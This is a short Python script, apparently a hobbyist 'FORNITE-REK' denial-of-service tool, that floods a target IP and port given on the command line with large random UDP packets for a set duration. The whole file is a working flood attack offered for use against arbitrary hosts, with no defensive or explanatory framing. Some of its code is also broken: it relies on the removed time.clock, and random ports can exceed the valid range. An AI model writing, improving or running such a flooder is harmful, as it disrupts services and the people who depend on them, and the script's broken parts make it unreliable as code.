#!/usr/bin/python

#UDP MIX by Leolynn
#Discord: Leolynn#0001


import socket,random,sys,time



if len(sys.argv)==1:
    print('')
    print('||| FORNITE-REK by Leolynn |||')
    print('')
    print('')
    sys.exit('Syntax: ./FORNITE-REK 1.1.1.1 80 300')



def udp_socket_extention():

    port = int(sys.argv[2])

    randport=(True,False)[port==0]

    ip = sys.argv[1]

    dur = int(sys.argv[3])

    clock=(lambda:0,time.clock)[dur>0]

    duration=(1,(clock()+dur))[dur>0]

    print('')
    print('||| FORNITE-REK by Leolynn |||')
    print('')
    print('')
    print('   Attack has been started...')


    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    bytes=random._urandom(15000)

    while True:

        port=(random.randint(1,15000000),port)[randport]

        if clock()<duration:

            sock.sendto(bytes,(ip,port))

        else:

            break



udp_socket_extention()
